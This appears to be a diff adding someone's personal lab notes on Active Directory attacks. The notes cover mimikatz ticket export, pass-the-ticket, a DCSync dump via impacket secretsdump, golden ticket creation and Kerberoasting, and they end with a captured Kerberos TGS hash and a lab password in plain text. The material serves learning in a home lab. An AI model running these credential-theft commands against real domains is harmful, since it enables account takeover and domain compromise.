@@ -1,0 +1,67 @@
+
+Methods Attack Active Directory: https://github.com/SecureAuthCorp/impacket
+
+------ --- -- -- - -- 
+
+Use this To Enumerate Service in msf:
+	auxiliary/gather/kerberos_enumusers
+
+
+For Get Tecket from System:
+	mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"  | Thrrow Error Even With Admin Privilege (i Supose Run on New Version Windows Server) |          page 320 => FAILED
+For Load Ticket into Memory Of The Lsass Process: (After it’s loaded, you should be able to access the system)
+	mimikatz.exe kerberos::ptt "<Path to ticket file>.kirbi" | Need Priovios Instrunction in mimikatz run 
+
+Tested On My Windows Server But Failed | Because Must test on Early Windows Not New , i suppose
+
+ - - -- - - - - - -
+
+DC Sync Attacks:
+	git clone https://github.com/SecureAuthCorp/impacket
+	secretsdump.py <Domain.local>/<username>:<password>@<local machine's IP address>
+
+Implemented (Must Implemet Active Directory)  => DONE
+
+- - --- - - - - 
+
+The following command creates the ticket and loads it into memory so that it can be used in a pass-the-ticket attack:
+	mimikatz # kerberos::golden /domain:<example.local> /sid:<SID> /user:<ADMINUSER ID> /krbtgt:<HASH> /ptt   | page 321
+
+Here, we included the /ptt (pass-the-ticket) flag, which tells mimikatz to associate the ticket with our current session. Now you can login to any machine with your new admin ticket. krbtgt is a account in Active directory Uses By kerberos Authentication Server
+
+Implemented (Must Implement Active Directory) on Window Server :( Beacuse `windows desktop` encounter with problem and nothing to Download => DONE
+
+----------- - - -- - 
+
+
+Excersize: 
+
+Kerberoasting Attack: (Script inside impacket Git) (Must Implement Active Directory) | page 322 => DONE
+	getuserspns.py <domain>/<username>:<password> -request
+	python3 GetUserSPNs.py fuck.local/bang:A123456789@az -request -dc-ip IP_DOMAIN_CONTROLLER *
+
+Description:
+
+	If Admin User or Privilge User Set SPN (Service principle Name) For One Account (Inside Windows Server act as Domain Controller => CMD ), tools              `GetUserSPNs.py` Can Fetch Spns Aboute it(User).
+	Also Fetch `Kerberos TGS (Ticket Granting Service) ticket` That You Can Crack It And Reach Password User. (in this Senario user is bang) *REQUIRE*
+`ldapsearch -x -H ldap://192.168.1.10 -D "bang@fuck.local" -w "A123456789@az" -b "dc=fuck,dc=local" "(servicePrincipalName=*)" servicePrincipalName`
+	(retrieves SPNs for domain controllers, computer accounts, and the krbtgt account because these are the only objects in your domain that currently
+         have SPNs It does not return SPNs for regular user accounts)
+
+
+Tested:
+
+`python3 GetUserSPNs.py fuck.local/bang:A123456789@az -request -dc-ip 192.168.1.10`                                                                 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName       Name  MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
+-------------------------  ----  ---------------------------------------------  --------------------------  --------------------------  ----------
+HTTP/webserver.fuck.local  bang  CN=Administrators,CN=Builtin,DC=fuck,DC=local  2025-03-16 00:27:06.867877  2025-03-19 13:30:43.364989             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*bang$FUCK.LOCAL$fuck.local/bang*$6801e534107fda67da96018b3b2f4763$261eb99a01b72b66621837f128ad2207d4d70a77a768c43c3330364b4ff2bf0e7be11897bb89ddca99058504875660168d6cec7074864a949ba3a0a556503beeb0a0868ba54fc97690c9e38d0da041e5749eb2d6f15bbb711e716011d3c7b24413311e7b36f60f68d3f06744ca0172907216cac7ffd5f0e8efab605af9653748e5f0ea7f9a59011b97f1d1c95d88c8ef359c55e94d0023db0c98bca2c1f1738fe938243a5d95a71238a77e5f5abe77aadc06c8495510638af25c3e9503be8655ab7d371e5c39a6c30a4293f136aecf7b753ff8e23f7b91958fde296a48914e710e8edfbc6c71aaa19a49dbcb15ea2bd2ece3b3aa22dd3f10c5bc423dd63cc6038f7c1a924ada6c5aaee0c27d6eab5a4d75a13ccc6f209fc31c3f5632e104c2767279722b2074ba48a66ba099f126c42839f3daf8eec8a975fd5f0553603a79a63492686cb86bf18b94c98618428abb71b899972f2e0516345bbd0fdaff62d0a8dd70a010ce485b5f3b6385144b767c83ffd94a95dfba92338103cf653eab3b7293d1cff63c85d8a4ef150f47fcc343b29e65a2e0ff7b0925192652e3c8162ee1a27f24c5a17a622e20acdee69f992a2f50200a19e65b28d1560b47587f248edb6135b98dedd6a9588a7d09868b658b583fa9969d1a50156bbdd79a3e60688d31ecd4d3ef48d298d8af27d3553a1b8a0872e8849328e2b84148a8a0ec0703e2147dd7a09d4632a2237825b95e4f3191f6a312249fd4fe6a1080aaeedcfeabd6677460519573a1f5549b3cec2a6ae5e935f55034cc9b44c3ce973acff8d5b152aeaa7cf194f432df102226af6602f25ff9d53ffcf69291478118adc3896af8ee481121cd4666ff64b97d824f67cdb80c3d00068237078a523eb74eb132dd7580cefd88b1f55b78a9d6b777b1a5cdf831a846307be1619d59b05b3280f89c167d47f47c7609c25d6b13a5703051afa7f35fe13dc6eb29e7a986f193301d66a7f0ff2eb65ab22c5ddbf2d35a245cac838c68299832cf7bde05ea72f825f976d72da7cbea7aa3560a5ae3d6c75593c4141096ce36df618ede7c4f0bc4c38c74645bdc9d75caac28bf2d9b4878e0e38e7cf77edba29c5e33ab07416a58717bd44d6132de5894e747f4c51ae3e26161543346a92b1a05dca1435e9cc6648156d27066c63a40cdf3ac698a2fbbe5bfd91a25a27297545c44e714338bb08ce41da6737cdace532aebba042029df3a7a317970099594c1bdb4326dc897193447adde392243800c45519bbda63cc060a46a3ec05981d597c9c33cb2823f5cd6ba5e44cd264e78330ff4334348a6738d1777e05614fe7aea59136f40a5ddf134dc3c41737f2fc2d9b4612d948deb33295f6342b8bdecdde99a78069709b0bd7db225794059309c3eadb8e665bc6c81c44e25efcb945af875d479bfae7e7f05a94fc2721d2681b0a3ebcfdf4b199596dc9b3ca72b5f2d884be0e54f2da4`
+
+
+
